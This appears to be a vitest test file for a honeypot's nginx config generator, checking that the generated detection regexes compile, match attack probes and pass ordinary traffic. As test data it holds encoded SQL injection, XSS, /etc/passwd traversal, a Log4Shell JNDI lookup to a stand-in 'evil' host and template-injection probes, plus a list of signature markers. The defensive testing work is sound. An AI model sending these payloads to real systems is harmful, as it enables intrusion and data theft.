import { describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { injectionSignatures } from "../src/detectors/index.js";

/**
 * The nginx generator rewrites each JS signature character by character so it also
 * matches percent-encoded payloads. It has no real grammar, so a signature using a
 * construct it mishandles produces a regex that is subtly invalid — and the only
 * symptom is nginx refusing to start, on the operator's machine, at deploy time.
 * These run the real script and check the artifact it emits.
 */
const generated = (): string =>
  execFileSync("npx", ["tsx", "scripts/generate-nginx.ts", "--stdout"], { encoding: "utf8", maxBuffer: 8 * 1024 * 1024 });

/** Pull one `map` block's `"~*<regex>" 1;` value back out, undoing nginx's quoting. */
function mapPattern(output: string, variable: string): string {
  // Scan to the block's own closing brace by line — the regex bodies are full of `}`
  // (`{2,}`, `%7d`, `[^{}]{0,400}`), so searching for the first "}" lands inside one.
  const lines = output.slice(output.indexOf(`$${variable} {`)).split("\n");
  let line: string | undefined;
  for (const candidate of lines.slice(1)) {
    if (candidate.trim() === "}") break;
    if (candidate.trim().startsWith('"~*')) {
      line = candidate;
      break;
    }
  }
  expect(line, `no pattern found for $${variable}`).toBeDefined();
  const quoted = line!.trim().replace(/^"~\*/, "").replace(/"\s*1;$/, "");
  // nginx collapses `\\` to `\` and `\"` to `"` inside a quoted string before PCRE
  // ever sees it, so undo that to recover the regex the engine actually compiles.
  return quoted.replace(/\\(["\\])/g, "$1");
}

describe("the generated nginx maps are regexes nginx can actually compile", () => {
  const output = generated();

  it("emits a $hp_bad_uri pattern that compiles", () => {
    const pattern = mapPattern(output, "hp_bad_uri");
    expect(() => new RegExp(pattern, "i")).not.toThrow();
  });

  it("emits a $hp_bad_ua pattern that compiles", () => {
    expect(() => new RegExp(mapPattern(output, "hp_bad_ua"), "i")).not.toThrow();
  });

  it("emits a $hp_bad_file pattern that compiles", () => {
    expect(() => new RegExp(mapPattern(output, "hp_bad_file"), "i")).not.toThrow();
  });

  it("never emits a conditional group, which is what a mangled `(?:` turns into", () => {
    // `:` is not a regex metacharacter, so percent-expanding it inside `(?:` produced
    // `(?` + `(?::|%3a)`. PCRE reads the result as a conditional group `(?(...)` and
    // refuses to load the config; nginx then will not start at all.
    expect(mapPattern(output, "hp_bad_uri")).not.toContain("(?(");
  });

  it("preserves every group-opening construct verbatim", () => {
    const pattern = mapPattern(output, "hp_bad_uri");
    // A non-capturing group in a source signature must survive as one.
    expect(pattern).toContain("(?:constructor|__class__");
  });

  it("still matches the encoded payloads the widening exists for", () => {
    const re = new RegExp(mapPattern(output, "hp_bad_uri"), "i");
    for (const probe of [
      "/?q=union%20select%20*%20from%20users",
      "/?q=%3Cscript%3Ealert(1)%3C/script%3E",
      "/?next=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "/?x=%24%7bjndi%3aldap%3a%2f%2fevil%7d",
      "/?tpl=%7b%7bconfig%7d%7d",
      "/?tpl={{config}}",
      "/../../etc/passwd",
    ]) {
      expect(re.test(probe), `edge map missed ${probe}`).toBe(true);
    }
  });

  it("leaves ordinary traffic alone", () => {
    const re = new RegExp(mapPattern(output, "hp_bad_uri"), "i");
    for (const ok of ["/", "/index.html", "/api/users?page=2", "/search?q=how%20to%20configure%20nginx"]) {
      expect(re.test(ok), `edge map false-positived on ${ok}`).toBe(false);
    }
  });

  it("carries every source signature into the edge map", () => {
    // A signature silently dropped here is a rule the operator believes nginx enforces
    // and it does not. One distinctive literal per signature, so a dropped or mangled
    // pattern shows up as a named failure.
    const pattern = mapPattern(output, "hp_bad_uri");
    const marker: Record<string, string> = {
      "path-traversal": "passwd",
      "sql-injection": "information_schema",
      xss: "document",
      "command-injection": "whoami",
      "template-injection": "__class__",
      log4shell: "jndi",
      "php-code-injection": "base64_decode",
      xxe: "ENTITY",
    };
    for (const { kind } of injectionSignatures) {
      const needle = marker[kind];
      expect(needle, `no marker registered for signature "${kind}" — add one`).toBeDefined();
      expect(pattern, `signature "${kind}" is missing from the edge map`).toContain(needle!);
    }
  });
});

describe("the generated config states the honeypot-side half of the setup", () => {
  // The edge config sets X-Forwarded-For, but the honeypot IGNORES it unless
  // trust_proxy is on — and nothing looks broken when it is missing: hits are still
  // recorded, they are just all attributed to the proxy's own address. Verified
  // against a real nginx + honeypot: with TRUST_PROXY=true the hit carries the
  // client's IP, without it the hit carries 127.0.0.1. So the instruction has to
  // survive in the artifact an operator actually reads while installing.
  const output = generated();

  it("names trust_proxy in the server-context file's requirements", () => {
    const serverFile = output.slice(output.indexOf("server-context config"));
    expect(serverFile).toMatch(/trust_proxy = true/);
    expect(serverFile).toMatch(/TRUST_PROXY/);
  });

  it("explains the silent failure rather than only naming the setting", () => {
    expect(output).toMatch(/attributed to nginx's own address/i);
  });
});

describe("the generated decoy locations are regexes nginx can load", () => {
  const output = generated();
  /** Every `location ~ "…"` / `location ~* "…"` line, as its unquoted regex and decoy id. */
  const regexLocations = output
    .split("\n")
    .filter((line) => /^location ~\*? /.test(line))
    .map((line) => {
      // The whole pattern must sit inside one quoted string: an anchor or suffix outside it
      // is not something nginx loads.
      const match = /^location ~\*? "((?:[^"\\]|\\.)*)" \{ return \d+; \}\s+# (\S+)/.exec(line);
      expect(match, `malformed location: ${line}`).not.toBeNull();
      return { id: match![2]!, pattern: match![1]!.replace(/\\(["\\])/g, "$1") };
    });

  it("quotes and compiles every regex location", () => {
    expect(regexLocations.length).toBeGreaterThan(10);
    for (const { id, pattern } of regexLocations) expect(() => new RegExp(pattern, "i"), id).not.toThrow();
  });

  it("matches a prefix decoy's variants at a boundary, and not a look-alike", () => {
    const dotenv = regexLocations.find((location) => location.id === "dotenv");
    expect(dotenv).toBeDefined();
    const regex = new RegExp(dotenv!.pattern, "i");
    for (const path of ["/.env", "/.env.production", "/.ENV/", "/.env.bak"]) expect(regex.test(path), path).toBe(true);
    expect(regex.test("/.environment-guide")).toBe(false);
  });
});
